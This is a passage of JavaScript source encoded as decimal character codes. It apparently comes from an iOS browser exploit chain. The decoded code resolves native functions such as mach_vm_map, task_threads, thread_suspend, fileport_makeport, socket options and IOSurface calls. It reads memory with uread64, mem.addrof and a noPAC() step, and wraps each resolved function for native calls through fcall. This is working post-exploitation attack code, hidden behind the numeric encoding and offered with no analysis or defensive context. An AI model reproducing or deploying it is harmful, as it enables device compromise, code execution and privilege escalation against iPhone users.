41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 77, 69, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 109, 101, 109, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 34, 41, 59, 10, 108, 101, 116, 32, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 111, 99, 107, 101, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 65, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 97, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 76, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 108, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 77, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 82, 67, 72, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 114, 99, 104, 114, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 34, 41, 59, 10, 108, 101, 116, 32, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 77, 79, 86, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 109, 111, 118, 101, 34, 41, 59, 10, 108, 101, 116, 32, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 34, 41, 59, 10, 108, 101, 116, 32, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 34, 41, 59, 10, 108, 101, 116, 32, 84, 72, 82, 69, 65, 68, 95, 83, 85, 83, 80, 69, 78, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 104, 114, 101, 97, 100, 95, 115, 117, 115, 112, 101, 110, 100, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 85, 78, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 117, 110, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 85, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 110, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 68, 85, 77, 80, 40, 97, 100, 100, 114, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 102, 99, 97, 108, 108, 40, 108, 111, 99, 97, 108, 95, 100, 117, 109, 112, 44, 32, 97, 100, 100, 114, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 109, 97, 108, 108, 111, 99, 40, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 98, 117, 102, 102, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 66, 105, 103, 73, 110, 116, 40, 115, 122, 41, 46, 97, 115, 73, 110, 116, 51, 50, 115, 41, 46, 102, 105, 108, 108, 40, 48, 120, 48, 48, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 40, 98, 117, 102, 102, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 115, 112, 101, 99, 105, 102, 105, 99, 40, 107, 101, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 71, 69, 84, 83, 80, 69, 67, 73, 70, 73, 67, 44, 32, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 116, 104, 114, 44, 32, 118, 97, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 44, 32, 116, 104, 114, 44, 32, 118, 97, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 40, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 44, 32, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 111, 110, 102, 115, 116, 114, 40, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 79, 78, 70, 83, 84, 82, 44, 32, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 114, 99, 104, 114, 40, 115, 44, 32, 99, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 82, 67, 72, 82, 44, 32, 115, 44, 32, 99, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 97, 116, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 65, 84, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 108, 101, 110, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 76, 69, 78, 44, 32, 115, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 115, 116, 114, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 83, 84, 82, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 109, 112, 40, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 77, 80, 44, 32, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 111, 99, 107, 101, 116, 40, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 79, 67, 75, 69, 84, 44, 32, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 40, 102, 100, 44, 32, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 44, 32, 102, 100, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 40, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 40, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 44, 32, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 109, 101, 109, 40, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 77, 69, 77, 44, 32, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 99, 99, 101, 115, 115, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 67, 67, 69, 83, 83, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 108, 111, 115, 101, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 76, 79, 83, 69, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 119, 114, 105, 116, 101, 40, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 87, 82, 73, 84, 69, 44, 32, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 97, 100, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 65, 68, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 119, 114, 105, 116, 101, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 87, 82, 73, 84, 69, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 109, 111, 118, 101, 40, 112, 97, 116, 104, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 77, 79, 86, 69, 44, 32, 112, 97, 116, 104, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 40, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 44, 32, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 110, 116, 108, 40, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 78, 84, 76, 44, 32, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 108, 115, 101, 101, 107, 40, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 76, 83, 69, 69, 75, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 115, 121, 110, 99, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 83, 89, 78, 67, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 